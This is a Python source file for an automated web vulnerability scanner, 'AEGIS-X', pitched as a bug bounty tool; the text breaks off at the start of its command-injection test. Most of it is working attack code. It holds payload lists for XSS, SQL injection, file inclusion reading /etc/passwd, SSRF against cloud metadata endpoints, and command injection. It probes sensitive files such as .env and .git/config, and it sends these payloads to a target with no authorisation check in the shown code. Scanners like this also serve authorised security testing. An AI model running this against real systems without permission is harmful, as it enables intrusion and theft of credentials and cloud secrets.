#!/usr/bin/env python3
"""
AEGIS-X Final - Production-Ready Vulnerability Scanner
The ultimate bug bounty hunting tool that actually finds vulnerabilities
"""

import asyncio
import aiohttp
import logging
import json
import time
import os
import re
import urllib.parse
import subprocess
import dns.resolver
import socket
from pathlib import Path
from typing import Dict, List, Any, Optional, Set
from datetime import datetime
from dataclasses import dataclass, asdict
import argparse
import base64
import hashlib
import random
import string

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/aegis_x_final.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    """Vulnerability representation"""
    id: str
    type: str
    severity: str
    url: str
    title: str
    description: str
    payload: str
    proof_of_concept: str
    impact: str
    remediation: str
    confidence: float
    verified: bool
    timestamp: str
    cvss_score: float = 0.0
    references: List[str] = None

    def __post_init__(self):
        if self.references is None:
            self.references = []

class AegisXFinal:
    """AEGIS-X Final - Production-ready vulnerability scanner"""
    
    def __init__(self):
        self.session = None
        self.vulnerabilities = []
        self.target_info = {}
        self.discovered_subdomains = set()
        self.discovered_endpoints = set()
        self.discovered_parameters = set()
        self.scan_stats = {
            'start_time': None,
            'end_time': None,
            'requests_made': 0,
            'endpoints_tested': 0,
            'parameters_tested': 0
        }
        
        # Comprehensive payload database
        self.payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                '<svg/onload=alert("XSS")>',
                '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
                '"><svg/onload=alert(/XSS/)>',
                "'><img src=x onerror=alert('XSS')>",
                '<script>alert`XSS`</script>',
                '<script>alert(document.domain)</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "') OR (1=1)--",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
                "1' WAITFOR DELAY '00:00:05'--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND SLEEP(5)--",
                "1'; SELECT SLEEP(5)--",
                "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "1' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>64--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
                "1' UNION SELECT column_name FROM information_schema.columns--",
                "1' AND (SELECT LENGTH(database()))>0--",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
                "1' AND IF(1=1,SLEEP(5),0)--",
                "1'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "....%2F....%2F....%2Fetc%2Fpasswd",
                "/etc/passwd%00",
                "../../../etc/passwd%00",
                "....//....//....//etc/passwd%00",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=../../../etc/passwd",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "file:///etc/passwd",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline",
                "php://input",
                "zip://test.zip%23shell.php",
                "phar://test.phar/shell.php",
                "compress.zlib://test.gz",
                "compress.bzip2://test.bz2",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            ],
            'ssrf': [
                "http://127.0.0.1:80",
                "http://localhost:80",
                "http://0.0.0.0:80",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://[::1]:80",
                "http://2130706433:80",
                "http://017700000001:80",
                "http://0x7f000001:80",
                "gopher://127.0.0.1:80",
                "dict://127.0.0.1:80",
                "ftp://127.0.0.1:80",
                "file:///etc/passwd",
                "ldap://127.0.0.1:389",
                "http://127.1:80",
                "http://0177.0.0.1:80",
                "http://2130706433:80",
                "http://127.000.000.1:80",
                "http://[::ffff:127.0.0.1]:80",
                "http://①②⑦.⓪.⓪.①:80",
                "http://169.254.169.254/computeMetadata/v1/instance/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
            ],
            'rce': [
                "; id",
                "| id",
                "& id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "& whoami",
                "&& whoami",
                "|| whoami",
                "`whoami`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                ";i\\d",
                "|i\\d",
                "`i\\d`",
                "$(i\\d)",
                ";%69%64",
                "|%69%64",
                "`%69%64`",
                "$(%69%64)",
            ]
        }
        
        # Parameter categories for targeted testing
        self.param_categories = {
            'file_params': ['file', 'path', 'page', 'include', 'template', 'view', 'doc', 'document'],
            'url_params': ['url', 'link', 'redirect', 'return', 'callback', 'webhook', 'api', 'endpoint'],
            'cmd_params': ['cmd', 'command', 'exec', 'system', 'shell', 'run', 'execute'],
            'search_params': ['q', 'search', 'query', 'keyword', 'term', 'find', 'lookup'],
            'user_params': ['id', 'user', 'username', 'email', 'name', 'account', 'profile'],
            'data_params': ['data', 'content', 'message', 'text', 'value', 'input']
        }
        
        # Comprehensive wordlists
        self.wordlists = {
            'subdomains': [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'ns3', 'test', 'staging',
                'dev', 'development', 'prod', 'production', 'admin', 'administrator', 'demo',
                'api', 'app', 'mobile', 'm', 'blog', 'shop', 'store', 'forum', 'support',
                'help', 'docs', 'documentation', 'wiki', 'news', 'media', 'static', 'assets',
                'cdn', 'images', 'img', 'css', 'js', 'files', 'download', 'downloads',
                'secure', 'ssl', 'vpn', 'remote', 'portal', 'gateway', 'proxy', 'lb',
                'loadbalancer', 'backup', 'old', 'new', 'beta', 'alpha', 'v1', 'v2', 'v3'
            ],
            'directories': [
                'admin', 'administrator', 'login', 'panel', 'control', 'cp', 'dashboard',
                'manage', 'management', 'manager', 'user', 'users', 'account', 'accounts',
                'profile', 'profiles', 'settings', 'config', 'configuration', 'setup',
                'install', 'installation', 'upgrade', 'update', 'backup', 'backups',
                'test', 'testing', 'dev', 'development', 'staging', 'prod', 'production',
                'api', 'v1', 'v2', 'v3', 'rest', 'graphql', 'soap', 'xml', 'json',
                'upload', 'uploads', 'download', 'downloads', 'files', 'file', 'documents',
                'docs', 'documentation', 'help', 'support', 'contact', 'about', 'info',
                'search', 'find', 'lookup', 'query', 'report', 'reports', 'stats',
                'statistics', 'analytics', 'log', 'logs', 'debug', 'error', 'errors'
            ],
            'sensitive_files': [
                '.env', '.git/config', '.git/HEAD', 'config.php', 'wp-config.php',
                'database.yml', 'settings.py', 'web.config', 'application.properties',
                'config.json', 'package.json', 'composer.json', 'Dockerfile',
                'backup.sql', 'dump.sql', 'phpinfo.php', 'info.php', 'test.php',
                'robots.txt', 'sitemap.xml', '.htaccess', '.htpasswd', 'crossdomain.xml'
            ]
        }
    
    async def initialize(self):
        """Initialize the scanner"""
        logger.info("🔥 Initializing AEGIS-X Final - Production Scanner")
        
        # Create directories
        os.makedirs("logs", exist_ok=True)
        os.makedirs("output", exist_ok=True)
        
        # Initialize session with optimized settings
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(
            limit=100, 
            limit_per_host=10,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        )
        
        self.scan_stats['start_time'] = datetime.now()
        logger.info("✅ AEGIS-X Final initialized successfully")
    
    async def scan_target(self, target: str) -> List[Vulnerability]:
        """Comprehensive vulnerability scan"""
        logger.info(f"🎯 Starting comprehensive scan for: {target}")
        
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        vulnerabilities = []
        
        try:
            # Phase 1: Intelligence Gathering
            logger.info("🔍 Phase 1: Intelligence Gathering")
            await self._intelligence_gathering(target)
            
            # Phase 2: Asset Discovery
            logger.info("🌐 Phase 2: Asset Discovery")
            await self._asset_discovery(target)
            
            # Phase 3: Endpoint Enumeration
            logger.info("📁 Phase 3: Endpoint Enumeration")
            await self._endpoint_enumeration(target)
            
            # Phase 4: Parameter Discovery
            logger.info("🔍 Phase 4: Parameter Discovery")
            await self._parameter_discovery(target)
            
            # Phase 5: Vulnerability Testing
            logger.info("⚡ Phase 5: Comprehensive Vulnerability Testing")
            
            # Test all discovered targets
            all_targets = [target] + list(self.discovered_subdomains)
            
            for test_target in all_targets[:15]:  # Limit to avoid overwhelming
                logger.info(f"🎯 Testing: {test_target}")
                
                # Test different vulnerability types
                vuln_tests = [
                    self._test_xss_vulnerabilities(test_target),
                    self._test_sqli_vulnerabilities(test_target),
                    self._test_lfi_vulnerabilities(test_target),
                    self._test_ssrf_vulnerabilities(test_target),
                    self._test_rce_vulnerabilities(test_target),
                    self._test_idor_vulnerabilities(test_target),
                    self._test_information_disclosure(test_target),
                    self._test_security_misconfigurations(test_target)
                ]
                
                # Run tests concurrently for efficiency
                test_results = await asyncio.gather(*vuln_tests, return_exceptions=True)
                
                for result in test_results:
                    if isinstance(result, list):
                        vulnerabilities.extend(result)
                    elif isinstance(result, Exception):
                        logger.error(f"❌ Test failed: {str(result)}")
            
            # Phase 6: Nuclei Integration
            logger.info("🚀 Phase 6: Nuclei Template Scanning")
            nuclei_vulns = await self._run_nuclei_scan(target)
            vulnerabilities.extend(nuclei_vulns)
            
            # Phase 7: Verification and Validation
            logger.info("✅ Phase 7: Vulnerability Verification")
            verified_vulns = await self._verify_vulnerabilities(vulnerabilities)
            
            # Phase 8: Risk Assessment
            logger.info("📊 Phase 8: Risk Assessment")
            assessed_vulns = await self._assess_risk(verified_vulns)
            
            self.scan_stats['end_time'] = datetime.now()
            scan_duration = (self.scan_stats['end_time'] - self.scan_stats['start_time']).total_seconds()
            
            logger.info(f"🎉 Comprehensive scan complete!")
            logger.info(f"⏱️ Scan duration: {scan_duration:.2f} seconds")
            logger.info(f"📊 Requests made: {self.scan_stats['requests_made']}")
            logger.info(f"🎯 Endpoints tested: {self.scan_stats['endpoints_tested']}")
            logger.info(f"🔍 Parameters tested: {self.scan_stats['parameters_tested']}")
            logger.info(f"🚨 Vulnerabilities found: {len(assessed_vulns)}")
            
            return assessed_vulns
            
        except Exception as e:
            logger.error(f"❌ Comprehensive scan failed: {str(e)}")
            return []
    
    async def _intelligence_gathering(self, target: str):
        """Advanced intelligence gathering"""
        try:
            async with self.session.get(target) as response:
                content = await response.text()
                self.scan_stats['requests_made'] += 1
                
                self.target_info = {
                    'status_code': response.status,
                    'headers': dict(response.headers),
                    'server': response.headers.get('Server', 'Unknown'),
                    'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                    'content_type': response.headers.get('Content-Type', 'Unknown'),
                    'content_length': len(content),
                    'technologies': self._detect_technologies(content, response.headers),
                    'security_headers': self._analyze_security_headers(response.headers)
                }
                
                # Extract information from HTML
                self._extract_intelligence_from_html(content, target)
                
                logger.info(f"📊 Target analyzed: {response.status} {self.target_info['server']}")
                logger.info(f"🔧 Technologies: {', '.join(self.target_info['technologies'])}")
                
        except Exception as e:
            logger.error(f"❌ Intelligence gathering failed: {str(e)}")
    
    def _detect_technologies(self, content: str, headers: Dict[str, str]) -> List[str]:
        """Detect technologies used by the target"""
        technologies = []
        
        # Server headers
        server = headers.get('Server', '').lower()
        if 'nginx' in server:
            technologies.append('Nginx')
        if 'apache' in server:
            technologies.append('Apache')
        if 'cloudflare' in server:
            technologies.append('Cloudflare')
        
        # Powered by headers
        powered_by = headers.get('X-Powered-By', '').lower()
        if 'php' in powered_by:
            technologies.append('PHP')
        if 'asp.net' in powered_by:
            technologies.append('ASP.NET')
        
        # Content analysis
        content_lower = content.lower()
        
        # JavaScript frameworks
        if 'react' in content_lower:
            technologies.append('React')
        if 'angular' in content_lower:
            technologies.append('Angular')
        if 'vue' in content_lower:
            technologies.append('Vue.js')
        if 'jquery' in content_lower:
            technologies.append('jQuery')
        
        # CMS detection
        if 'wp-content' in content_lower or 'wordpress' in content_lower:
            technologies.append('WordPress')
        if 'drupal' in content_lower:
            technologies.append('Drupal')
        if 'joomla' in content_lower:
            technologies.append('Joomla')
        
        return technologies
    
    def _analyze_security_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze security headers"""
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'X-Permitted-Cross-Domain-Policies': headers.get('X-Permitted-Cross-Domain-Policies'),
            'Referrer-Policy': headers.get('Referrer-Policy')
        }
        
        missing_headers = [k for k, v in security_headers.items() if v is None]
        
        if missing_headers:
            vuln = Vulnerability(
                id=f"missing_headers_{int(time.time())}",
                type="Security Headers",
                severity="Low",
                url=self.target_info.get('url', ''),
                title="Missing Security Headers",
                description=f"Missing security headers: {', '.join(missing_headers)}",
                payload="N/A",
                proof_of_concept="curl -I <target>",
                impact="Potential security risks due to missing protective headers",
                remediation="Implement missing security headers",
                confidence=0.9,
                verified=True,
                timestamp=datetime.now().isoformat(),
                cvss_score=3.1,
                references=["https://owasp.org/www-project-secure-headers/"]
            )
            self.vulnerabilities.append(vuln)
        
        return {
            'present': {k: v for k, v in security_headers.items() if v is not None},
            'missing': missing_headers
        }
    
    def _extract_intelligence_from_html(self, content: str, target: str):
        """Extract intelligence from HTML content"""
        # Extract forms and parameters
        form_pattern = r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?[^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
        
        for action, form_content in forms:
            input_pattern = r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
            self.discovered_parameters.update(inputs)
        
        # Extract links
        link_pattern = r'href=["\']?([^"\'>\s]+)["\']?'
        links = re.findall(link_pattern, content, re.IGNORECASE)
        
        for link in links:
            if link.startswith('/'):
                full_url = target.rstrip('/') + link
                self.discovered_endpoints.add(full_url)
            elif link.startswith('http'):
                self.discovered_endpoints.add(link)
        
        # Extract JavaScript endpoints and parameters
        js_patterns = [
            r'["\']([/][^"\']*)["\']',
            r'url\s*:\s*["\']([^"\']+)["\']',
            r'ajax\(["\']([^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']'
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 1 and not match.endswith(('.css', '.js', '.png', '.jpg', '.gif')):
                    if match.startswith('/'):
                        full_url = target.rstrip('/') + match
                        self.discovered_endpoints.add(full_url)
        
        # Extract API endpoints
        api_patterns = [
            r'/api/[^"\'>\s]+',
            r'/v\d+/[^"\'>\s]+',
            r'/rest/[^"\'>\s]+',
            r'/graphql[^"\'>\s]*'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = target.rstrip('/') + match
                self.discovered_endpoints.add(full_url)
    
    async def _asset_discovery(self, target: str):
        """Discover subdomains and related assets"""
        domain = target.replace('https://', '').replace('http://', '').split('/')[0]
        
        # DNS enumeration
        tasks = []
        for subdomain in self.wordlists['subdomains'][:30]:  # Test top 30 subdomains
            tasks.append(self._test_subdomain(subdomain, domain))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🌐 Discovered {len(self.discovered_subdomains)} subdomains")
    
    async def _test_subdomain(self, subdomain: str, domain: str):
        """Test individual subdomain"""
        try:
            test_domain = f"{subdomain}.{domain}"
            
            # Try to resolve DNS
            try:
                dns.resolver.resolve(test_domain, 'A')
                subdomain_url = f"https://{test_domain}"
                
                # Test if subdomain is accessible
                try:
                    async with self.session.get(subdomain_url) as response:
                        self.scan_stats['requests_made'] += 1
                        if response.status == 200:
                            self.discovered_subdomains.add(subdomain_url)
                            logger.info(f"🌐 Found subdomain: {subdomain_url}")
                except:
                    pass
                    
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                pass
            except Exception:
                pass
                
        except Exception:
            pass
    
    async def _endpoint_enumeration(self, target: str):
        """Enumerate endpoints and directories"""
        base_url = target.rstrip('/')
        
        # Test directories
        tasks = []
        for directory in self.wordlists['directories'][:40]:  # Test top 40 directories
            tasks.append(self._test_endpoint(f"{base_url}/{directory}"))
        
        # Test sensitive files
        for file_path in self.wordlists['sensitive_files']:
            tasks.append(self._test_endpoint(f"{base_url}/{file_path}"))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"📁 Discovered {len(self.discovered_endpoints)} endpoints")
    
    async def _test_endpoint(self, url: str):
        """Test individual endpoint"""
        try:
            async with self.session.get(url) as response:
                self.scan_stats['requests_made'] += 1
                self.scan_stats['endpoints_tested'] += 1
                
                if response.status in [200, 301, 302, 403]:
                    self.discovered_endpoints.add(url)
                    
                    if response.status == 403:
                        # Forbidden directory might be interesting
                        path = url.split('/')[-1]
                        vuln = Vulnerability(
                            id=f"forbidden_dir_{path}_{int(time.time())}",
                            type="Directory Listing",
                            severity="Low",
                            url=url,
                            title=f"Forbidden Directory: {path}",
                            description=f"Directory {path} exists but is forbidden (403)",
                            payload="N/A",
                            proof_of_concept=f"curl {url}",
                            impact="Potential sensitive directory exposure",
                            remediation="Review directory permissions",
                            confidence=0.7,
                            verified=True,
                            timestamp=datetime.now().isoformat(),
                            cvss_score=2.1
                        )
                        self.vulnerabilities.append(vuln)
                
                await asyncio.sleep(0.05)  # Rate limiting
        except Exception:
            pass
    
    async def _parameter_discovery(self, target: str):
        """Discover parameters from various sources"""
        # Analyze discovered endpoints for parameters
        for endpoint in list(self.discovered_endpoints)[:20]:  # Test top 20 endpoints
            try:
                async with self.session.get(endpoint) as response:
                    self.scan_stats['requests_made'] += 1
                    if response.status == 200:
                        content = await response.text()
                        
                        # Extract parameters from JavaScript
                        js_param_patterns = [
                            r'["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']:\s*["\']?[^"\']*["\']?',
                            r'\.([a-zA-Z_][a-zA-Z0-9_]*)\s*=',
                            r'data-([a-zA-Z_][a-zA-Z0-9_-]*)',
                            r'name=["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']',
                            r'id=["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']'
                        ]
                        
                        for pattern in js_param_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            self.discovered_parameters.update(matches)
                        
            except Exception:
                continue
        
        logger.info(f"🔍 Discovered {len(self.discovered_parameters)} parameters")
    
    async def _test_xss_vulnerabilities(self, target: str) -> List[Vulnerability]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Get relevant parameters
        test_params = self._get_relevant_params(['search_params', 'data_params', 'user_params'])
        
        for param in test_params[:12]:  # Test top 12 parameters
            for payload in self.payloads['xss'][:8]:  # Test top 8 XSS payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['requests_made'] += 1
                        self.scan_stats['parameters_tested'] += 1
                        
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if payload is reflected and potentially executable
                            if self._is_xss_vulnerable(content, payload):
                                vuln = Vulnerability(
                                    id=f"xss_{param}_{int(time.time())}_{random.randint(1000, 9999)}",
                                    type="Cross-Site Scripting (XSS)",
                                    severity="Medium",
                                    url=test_url,
                                    title=f"Reflected XSS in parameter '{param}'",
                                    description=f"XSS payload reflected and potentially executable in parameter '{param}'",
                                    payload=payload,
                                    proof_of_concept=f"Visit: {test_url}",
                                    impact="Session hijacking, data theft, malicious actions possible",
                                    remediation="Implement proper input validation and output encoding",
                                    confidence=0.8,
                                    verified=False,
                                    timestamp=datetime.now().isoformat(),
                                    cvss_score=6.1,
                                    references=["https://owasp.org/www-community/attacks/xss/"]
                                )
                                vulnerabilities.append(vuln)
                                logger.info(f"🚨 XSS found: {param} in {target}")
                                break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _is_xss_vulnerable(self, content: str, payload: str) -> bool:
        """Check if XSS payload is vulnerable"""
        # Check if payload is reflected
        if payload not in content and payload.replace('"', '&quot;') not in content:
            return False
        
        # Check if payload is in executable context
        script_contexts = [
            r'<script[^>]*>' + re.escape(payload),
            r'on\w+=["\']?[^"\']*' + re.escape(payload),
            r'javascript:[^"\']*' + re.escape(payload)
        ]
        
        for context in script_contexts:
            if re.search(context, content, re.IGNORECASE):
                return True
        
        # Check if payload creates new HTML elements
        if '<' in payload and '>' in payload:
            return True
        
        return False
    
    async def _test_sqli_vulnerabilities(self, target: str) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Get relevant parameters
        test_params = self._get_relevant_params(['user_params', 'search_params', 'data_params'])
        
        for param in test_params[:10]:  # Test top 10 parameters
            for payload in self.payloads['sqli'][:12]:  # Test top 12 SQLi payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        end_time = time.time()
                        self.scan_stats['requests_made'] += 1
                        self.scan_stats['parameters_tested'] += 1
                        
                        content = await response.text()
                        response_time = end_time - start_time
                        
                        # Check for SQL injection indicators
                        if self._is_sqli_vulnerable(content, payload, response_time):
                            severity = "High" if self._has_sql_errors(content) else "Medium"
                            confidence = 0.9 if self._has_sql_errors(content) else 0.7
                            
                            vuln = Vulnerability(
                                id=f"sqli_{param}_{int(time.time())}_{random.randint(1000, 9999)}",
                                type="SQL Injection",
                                severity=severity,
                                url=test_url,
                                title=f"SQL Injection in parameter '{param}'",
                                description=f"SQL injection vulnerability detected in parameter '{param}'",
                                payload=payload,
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Database access, data extraction, data manipulation possible",
                                remediation="Use parameterized queries and input validation",
                                confidence=confidence,
                                verified=False,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=8.1 if severity == "High" else 6.5,
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 SQLi found: {param} in {target}")
                            break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _is_sqli_vulnerable(self, content: str, payload: str, response_time: float) -> bool:
        """Check if SQL injection is vulnerable"""
        # Check for SQL errors
        if self._has_sql_errors(content):
            return True
        
        # Check for time-based SQLi
        time_based = any(keyword in payload.upper() for keyword in ['SLEEP', 'WAITFOR', 'DELAY'])
        if time_based and response_time > 4:
            return True
        
        # Check for union-based SQLi
        union_based = 'UNION' in payload.upper()
        if union_based and ('NULL' in content or len(content) > 10000):
            return True
        
        return False
    
    def _has_sql_errors(self, content: str) -> bool:
        """Check for SQL error messages"""
        sql_errors = [
            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
            'ORA-01756', 'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
            'SQLServer JDBC Driver', 'PostgreSQL query failed',
            'Warning: pg_', 'valid PostgreSQL result', 'Npgsql.',
            'Driver][SQL Server]', 'OLE DB provider', 'SQLite/JDBCDriver',
            'SQLite.Exception', 'System.Data.SQLite.SQLiteException',
            'Warning: sqlite_', 'function.sqlite', '[SQLITE_ERROR]',
            'SQL syntax', 'mysql_connect', 'ORA-00933', 'ORA-00921'
        ]
        
        return any(error.lower() in content.lower() for error in sql_errors)
    
    async def _test_lfi_vulnerabilities(self, target: str) -> List[Vulnerability]:
        """Test for Local File Inclusion vulnerabilities"""
        vulnerabilities = []
        
        # Get file-related parameters
        test_params = self._get_relevant_params(['file_params'])
        
        for param in test_params[:8]:  # Test top 8 file parameters
            for payload in self.payloads['lfi'][:10]:  # Test top 10 LFI payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['requests_made'] += 1
                        self.scan_stats['parameters_tested'] += 1
                        
                        content = await response.text()
                        
                        # Check for LFI indicators
                        if self._is_lfi_vulnerable(content):
                            vuln = Vulnerability(
                                id=f"lfi_{param}_{int(time.time())}_{random.randint(1000, 9999)}",
                                type="Local File Inclusion (LFI)",
                                severity="High",
                                url=test_url,
                                title=f"Local File Inclusion in parameter '{param}'",
                                description=f"LFI vulnerability allows reading local files via parameter '{param}'",
                                payload=payload,
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Access to sensitive files and system information",
                                remediation="Implement proper file path validation and restrictions",
                                confidence=0.9,
                                verified=False,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=7.5,
                                references=["https://owasp.org/www-community/attacks/Path_Traversal"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 LFI found: {param} in {target}")
                            break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _is_lfi_vulnerable(self, content: str) -> bool:
        """Check for LFI vulnerability indicators"""
        lfi_indicators = [
            'root:x:0:0:', 'daemon:x:1:1:', '/bin/bash', '/bin/sh',
            '[boot loader]', '[operating systems]', 'Windows Registry',
            '<?php', 'mysql_connect', 'database_password',
            'Linux version', 'GNU/Linux', 'kernel version'
        ]
        
        return any(indicator in content for indicator in lfi_indicators)
    
    async def _test_ssrf_vulnerabilities(self, target: str) -> List[Vulnerability]:
        """Test for Server-Side Request Forgery vulnerabilities"""
        vulnerabilities = []
        
        # Get URL-related parameters
        test_params = self._get_relevant_params(['url_params'])
        
        for param in test_params[:8]:  # Test top 8 URL parameters
            for payload in self.payloads['ssrf'][:8]:  # Test top 8 SSRF payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        end_time = time.time()
                        self.scan_stats['requests_made'] += 1
                        self.scan_stats['parameters_tested'] += 1
                        
                        content = await response.text()
                        response_time = end_time - start_time
                        
                        # Check for SSRF indicators
                        if self._is_ssrf_vulnerable(content, payload, response_time):
                            confidence = 0.8 if self._has_ssrf_indicators(content) else 0.6
                            vuln = Vulnerability(
                                id=f"ssrf_{param}_{int(time.time())}_{random.randint(1000, 9999)}",
                                type="Server-Side Request Forgery (SSRF)",
                                severity="High",
                                url=test_url,
                                title=f"SSRF in parameter '{param}'",
                                description=f"SSRF vulnerability allows making requests to internal resources via parameter '{param}'",
                                payload=payload,
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Access to internal services and sensitive data",
                                remediation="Implement URL validation and whitelist allowed domains",
                                confidence=confidence,
                                verified=False,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=8.6,
                                references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 SSRF found: {param} in {target}")
                            break
                    
                    await asyncio.sleep(0.1)
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _is_ssrf_vulnerable(self, content: str, payload: str, response_time: float) -> bool:
        """Check for SSRF vulnerability indicators"""
        # Check for SSRF indicators in content
        if self._has_ssrf_indicators(content):
            return True
        
        # Check for unusual response times (potential internal requests)
        if response_time > 10 or (response_time < 0.1 and 'localhost' in payload):
            return True
        
        return False
    
    def _has_ssrf_indicators(self, content: str) -> bool:
        """Check for SSRF indicators in content"""
        ssrf_indicators = [
            'Connection refused', 'Connection timed out',
            'No route to host', 'Network is unreachable',
            'ami-id', 'instance-id', 'local-hostname',  # AWS metadata
            'computeMetadata', 'metadata.google.internal',  # GCP metadata
            'curl: (7)', 'curl: (28)', 'curl: (6)',  # curl errors
            'root:x:0:0:', 'daemon:x:1:1:'  # /etc/passwd via file://
        ]
        
        return any(indicator in content for indicator in ssrf_indicators)
    
    async def _test_rce_vulnerabilities(self, target: str) -> List[Vulnerability]:
